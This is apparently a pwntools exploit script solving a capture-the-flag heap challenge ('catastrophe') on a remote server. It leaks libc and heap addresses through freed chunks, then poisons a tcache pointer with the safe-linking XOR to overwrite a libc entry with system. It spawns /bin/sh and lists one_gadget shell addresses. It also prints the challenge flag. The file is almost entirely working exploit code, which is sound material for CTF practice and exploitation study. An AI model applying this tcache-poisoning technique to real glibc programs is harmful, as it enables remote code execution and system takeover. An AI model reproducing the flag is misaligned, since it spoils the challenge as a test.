#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mc.ax --port 31273 ./catastrophe_patched
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./catastrophe_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mc.ax'
port = int(args.PORT or 31273)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  '.'

io = start()

def add(idx,size,msg):
    io.sendline('1')
    io.sendline(str(idx))
    io.sendline(str(size))
    io.sendline(str(msg))
    # io.sendlineafter("> ",'1')
    # io.sendlineafter("> ",str(idx))
    # io.sendlineafter("> ",str(size))
    # io.sendlineafter(": ",str(msg))

def free(idx):
    io.sendline('2')
    io.sendline(str(idx))
    # io.sendlineafter("> ",'2')
    # io.sendlineafter("> ",str(idx))

def view(idx):
    io.sendline('3')
    io.sendline(str(idx))
    # io.sendlineafter("> ",'3')
    # io.sendlineafter("> ",str(idx))

for i in range(8):
    add(i,0x100,'junk')
add(8,0x10,'junk')

for i in range(8):
    free(i)

view(7)

libc = ELF("./libc.so.6")
# io.recvuntil("\x7f")[-6:]
leak = u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
# leak = u64(io.recvline()[:-1].ljust(8,"\x00"))
# print(hex(leak-0x10))
libc.address = leak - 0x219cd0 -0x10
print(hex(libc.address))
print(hex(libc.sym['__malloc_hook']))

view(0)

heap_base = u64(io.recvuntil("\x05")[-5:].ljust(8,"\x00")) << 12
print(hex(heap_base))

# print(hex(libc.sym.__strlen_avx2))

for i in range(8):
    add(i,0x100,'junk')

for i in range(9):
    add(i,0x60,'junk{}'.format(i))

for i in range(9):
    free(i)

free(7)
free(8)

for i in range(7):
    add(i,0x60,'junk')

# add(0,0x70,'\x00'*0x60+p64(0)+p64(0x71))
# add(1,0x70,'JUNNNKK')

# free(0)
# free(1)

# add(7,0x60,p64(libc.sym['__free_hook'] ^ heap_base >> 12))
# # add(7,0x60,p64(libc.sym['__malloc_hook']-0x3))
add(7,0x60,p64(libc.address + 0x219098 - 8 ^ heap_base >> 12))

# 0xfa0
# add(7,0x60,p64(heap_base + 0xfa0 ^ heap_base >> 12))
add(8,0x60,"/bin/sh\x00")
add(9,0x60,"/bin/sh\x00")
add(1,0x60,p64(libc.sym['system'])*2)
# add(1,0x60,p64(libc.address + 0xcbd1a))

# add(1,0x60,p64(libc.sym['system']))

# 0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL
#   rbp == NULL || (u16)[rbp] == NULL

# 0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

# 0xebcf5 execve("/bin/sh", r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xebcf8 execve("/bin/sh", rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL


# add(1,0x20,'/bin/sh\x00')
# free(9)
view(8)

# hope{apparently_not_good_enough_33981d897c3b0f696e32d3c67ad4ed1e}
io.interactive()

